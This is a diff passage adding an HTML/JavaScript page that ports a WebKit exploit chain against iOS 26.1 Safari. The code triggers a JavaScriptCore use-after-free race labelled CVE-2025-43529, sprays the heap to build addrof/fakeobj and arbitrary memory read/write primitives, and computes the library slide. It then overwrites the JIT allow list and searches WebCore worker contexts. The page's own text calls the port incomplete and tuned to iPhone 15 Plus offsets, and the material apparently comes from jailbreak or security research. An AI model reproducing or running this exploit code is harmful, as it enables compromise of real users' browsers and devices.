+                            (BigInt(read64Str.charCodeAt(3)) << 48n);
+                    };
+
+                    function read32(addr) {
+                        read64BigUint64[1] = addr;
+                        return (BigInt(read64Str.charCodeAt(0))
+                            | BigInt(read64Str.charCodeAt(1)) << 16n);
+                    }
+                } catch (e) {
+                    report.reason = `read64 setup failed: ${e.message}`;
+                    return { ok: false, report };
+                }
+                try {
+                    this.read32 = read32;
+                    this.read64 = read64;
+                    this.write64 = write64;
+                    const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
+                    const heap = vm + 0xc0n;
+                    const isSafeToCollect = heap + 0x241n;
+                    function write8(ptr, u16) {
+                        let value = read64(ptr);
+                        value &= ~0xffn;
+                        value |= u16;
+                        write64(ptr, value);
+                    };
+                    write8(isSafeToCollect, 0n);
+
+                    //log("getting executable!");
+                    //THIS PART CRASHES, WE NEED IT TO GET THE CORRECT SLIDE SLIDE 
+                    //log("ftoi:" + ftoi (addrof(parseFloat)));
+                    //("itof:" + hex(itof(addrof(parseFloat))));
+                    const executable =
+                        read64(ftoi(itof(addrof(parseFloat) + 0x18n))); //questionable +0x18n?
+                    log("executable:" + hex(executable));
+                    // test debug
+                    //const executable = read64(addrof(parseFloat) + 0x18n);
+
+                    //test debug 
+
+                    globalFuncParseFloat = noPAC(read64(executable + 0x28n));
+                    log("globalFuncParseFloat:" + hex(globalFuncParseFloat)) 
+                    const jsc_base = (function () {
+                        let jsc_base = globalFuncParseFloat & ~0xfffn;
+
+                        while (1) {
+                            read64BigUint64[1] = jsc_base;
+                            if (read64Str.charCodeAt(0) == 0xfacf && read64Str.charCodeAt(1) == 0xfeed) {
+                                return jsc_base;
+                            }
+                            jsc_base -= 0x1000n;
+                        }
+                    })();
+                    log("jsc_base now: " + hex(jsc_base));
+                    function parse_adrp(addr) {
+                        const x = Number(read32(addr));
+                        const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
+                        const immlo = x >> 29 & 3;
+                        const imm = immhi << 14 | immlo << 12;
+                        return imm + Math.floor(Number(addr) / 0x1000) * 0x1000;
+                    }
+                    function parse_add(addr) {
+                        const insn = Number(read32(addr));
+                        const off = insn >> 10 & (1 << 12) - 1;
+                        return off;
+                    }
+                    function parse_adrp_add(addr, is_ldrb = false) {
+                        let res = parse_adrp(addr);
+                        let add = parse_add(addr + 4n);
+                        return res + add;
+                    }
+                    slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
+                    log("slide:" + hex(slide))
+                    for (const key of Object.keys(offsets)) {
+                        if (offsets[key] >= 0x100000000n) offsets[key] += slide;
+                    }
+                    log("offset keys patched with slide");
+                    log("[modify JitAllowList]: writing..");
+                    write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
+                    write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
+                    log("[modify JitAllowList]: reading..")
+                    log("jitAllowList_once:" + hex(read64(offsets.JavaScriptCore__jitAllowList_once)));
+                    log("JitAllowList:" + hex(read64(offsets.JavaScriptCore__jitAllowList + 8n)));
+
+                    const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
+                    const contexts_length = read32(contexts - 4n);
+                    log(`contexts_length:${hex(contexts_length)}`);
+                    //self.postMessage({
+                    //type: 'prepare_dlopen_workers'
+                    //        });
+                             
+                            let worker;
+
+                    for (let i = 0n; i < contexts_length; ++i) {
+                        const scriptExecutionContext = read64(contexts + 0x30n * i + 0x20n);
+                        if (!scriptExecutionContext)
+                            continue;
+
+                        const vtable = read64(scriptExecutionContext);
+                        log("vtable" + hex(noPAC(vtable)));
+                        //print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
+                        log("offset:" + hex(offsets.WebCore__DedicatedWorkerGlobalScope_vtable))
+                        if (noPAC(vtable) != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
+                            continue;
+                        const id = read64(scriptExecutionContext + 0x138n);
+                        log("id:" + hex(id));
+                        if (id > maximum_id) {
+                            maximum_id = id;
+                            worker = scriptExecutionContext;
+                            log("worker:" + worker)
+                        }
+                    }
+                    setStatus("finished");
+
+                } catch (e) {
+                    report.reason = `read64 setup failed: ${e.message}`;
+                    return { ok: false, report };
+                }
+            }
+
+            async function init() {
+                const runner = document.getElementById("runBtn");
+                if (window.__cve43529Running) return;
+                window.__cve43529Running = true;
+                runner.disabled = true;
+                document.getElementById("output-list").textContent = "";
+                setStatus("running");
+
+                log("Stage 1: CVE-2025-43529 UAF trigger");
+
+                const rootArray = new Array(0x40_0000).fill(1.1);
+                const rootIndex = rootArray.length - 1;
+                const reclaimed = [];
+
+                function triggerUAF(flag, k, allocCount) {
+                    const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+                    rootArray[rootIndex] = A;
+
+                    const forGC = [];
+                    const a = new Date(1111);
+                    a[0] = 1.1;
+
+                    for (let j = 0; j < allocCount; ++j) {
+                        forGC.push(new ArrayBuffer(0x80_0000));
+                    }
+
+                    A.p2 = forGC;
+                    const b = { p0: 0x42424242, p1: 1.1 };
+
+                    let f = b;
+                    if (flag) f = 1.1;
+
+                    A.p1 = f;
+
+                    let v = 1.1;
+                    for (let i = 0; i < 1e6; ++i) {
+                        for (let j = 0; j < k; ++j) {
+                            v = i;
+                            v = j;
+                        }
+                    }
+
+                    b.p0 = v;
+                    b.p1 = a;
+                }
+
+                function recursive(n) {
+                    if (n === 0) return;
+                    recursive((n | 0) - 1);
+                }
+
+                function safeRecursive(n) {
+                    try { recursive(n); } catch (e) { }
+                }
+
+                triggerUAF(true, 1, 1);
+                triggerUAF(false, 1, 1);
+
+                for (let i = 0; i < 1000; ++i) {
+                    triggerUAF(false, 0, 0);
+                }
+
+                for (let i = 0; i < 20; ++i) {
+                    safeRecursive(800);
+                }
+
+                let success = false;
+                let lastProgress = Date.now();
+
+                for (let k = 0; k < 15000; ++k) {
+                    triggerUAF(false, 10, (k % 5) + 1);
+                    safeRecursive(800);
+
+                    for (let i = 0; i < 3; ++i) {
+                        new ArrayBuffer(0x4000);
+                    }
+
+                    let freed;
+                    try {
+                        freed = rootArray[rootIndex].p1.p1;
+                    } catch (e) {
+                        continue;
+                    }
+
+                    let winningArray = null;
+                    const noCow = 13.37;
+                    for (let i = 0; i < 64; ++i) {
+                        const spray = [13.37, 2.2, 3.3, 4.4, noCow];
+                        reclaimed.push(spray);
+                        try {
+                            if (freed[0] === 13.37) {
+                                winningArray = spray;
+                                break;
+                            }
+                        } catch (e) { }
+                    }
+
+                    if (!winningArray) {
+                        if ((Date.now() - lastProgress) > 1500) {
+                            log(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`, "warn");
+                            setStatus(`racing ${k}/15000`);
+                            lastProgress = Date.now();
+                            await new Promise(r => setTimeout(r, 1));
+                        }
+                        continue;
+                    }
+
+                    success = true;
+
+                    // Critical primitive setup. Avoid DOM logging until addrof/fakeobj and
+                    // the DS scribble proof have finished.
+                    const boxedArray = winningArray;
+                    boxedArray[0] = {};
+                    const unboxedArray = freed;
+                    self[0] = unboxedArray;
+                    self[1] = boxedArray;
+
+                    function addrof(obj) {
+                        boxedArray[0] = obj;
+                        return ftoi(unboxedArray[0]);
+                    }
+
+                    function fakeobj(addr) {
+                        unboxedArray[0] = itof(addr);
+                        return boxedArray[0];
+                    }
+
+                    const addrBoxed = addrof(boxedArray);
+                    const addrRoot = addrof(rootArray);
+                    const fakeSelf = fakeobj(addrBoxed);
+
+                    const ds = buildDSScribblePrimitives(addrof, fakeobj);
+
+                    log(`UAF won at attempt ${k}; reclaimed arrays=${reclaimed.length}`, "ok");
+                    log(`addrof(boxedArray)=${hex(addrBoxed)}`, "ok");
+                    log(`addrof(rootArray)=${hex(addrRoot)}`, "ok");
+                    log(`fakeobj(addrof(boxedArray)) self type=${Object.prototype.toString.call(fakeSelf)}`, "ok");
+                    break;
+                }
+
+                if (!success) {
+                    log("Stage 1 failed: race not won after max attempts", "fail");
+                    setStatus("failed to win UAF race");
+                }
+
+                runner.disabled = false;
+                window.__cve43529Running = false;
+            }
+
+            window.addEventListener("load", () => {
+                //get slide
+                // ---- Top bar: modal + title ----
+                const overlay = document.getElementById("overlay");
+                const modalTitle = document.getElementById("modalTitle");
+                const modalBody = document.getElementById("modalBody");
+
+                const MODALS = {
+                    about: {
+                        title: "About",
+                        html:
+                            `<p>(Incomplete) port of the Darksword webkit userland chain for iOS 26.1</p>` +
+                            `<p class="muted">Repo: <a href="https://github.com/GenericCoding/pois0nSword">Proudly open source and hosted on Github</a></p>`
+                    },
+                    credits: {
+                        title: "Credits",
+                        html:
+                            `<p class="muted"><b>Contributors:</b></p>` +
+                            `<div class="rows">` +
+                            `<div class="row"><span class="k">Primary developer: </span><span class="v">GenericCoding<br>(<a href="https://x.com/GenericCoding">@GenericCoding</a>)</span></div>` +
+                            `<div class="row"><span class="k">Debugging and webcontent R/W fix:</span><span class="v">Johnny<br>(<a href="https://x.com/zeroxjf">@zeroxjf</a>)</span></div>` +
+                            `<div class="row"><span class="k">Help with offsets:</span><span class="v">Huy Nguyen <br>(<a href="https://x.com/Little_34306">@Little_34306</a>)</span></div>` +
+                            `<p class="muted"><b>Acknowledgments:</b></p>` +
+                            `<div class="row"><span class="k">POC for cve-2025-43529 <a href="https://github.com/jir4vv1t">[repo]</a>:</span><span class="v">jir4vv1t <br>(<a href="https://x.com/jir4vv1t">@jir4vv1t</a>)</span></div>` +
+                            `</div>`
+                    }
+                };
+
+                function openModal(key) {
+                    const m = MODALS[key];
+                    if (!m) return;
+                    modalTitle.textContent = m.title;
+                    modalBody.innerHTML = m.html;
+                    overlay.dataset.open = "true";
+                }
+                function closeModal() {
+                    if (overlay.dataset.open !== "true") return;
+                    overlay.dataset.open = "closing";
+                    setTimeout(() => {
+                        if (overlay.dataset.open === "closing") overlay.dataset.open = "false";
+                    }, 240);
+                }
+
+                document.getElementById("aboutBtn").addEventListener("click", () => openModal("about"));
+                document.getElementById("creditsBtn").addEventListener("click", () => openModal("credits"));
+                document.getElementById("modalClose").addEventListener("click", closeModal);
+                overlay.addEventListener("click", (e) => { if (e.target === overlay) closeModal(); });
+                document.addEventListener("keydown", (e) => {
+                    if (e.key === "Escape") closeModal();
+                    if (e.key === "Enter" && overlay.dataset.open === "true") closeModal();
+                });
+                var globalFuncParseFloat = 0n;
+                log('Press "run" to start, only iOS 26.1 is tested. Offsets are for the iPhone 15 plus only currently, and work on vphone.');
+                
+            });
+        </script>
+</body>
+
+</html>
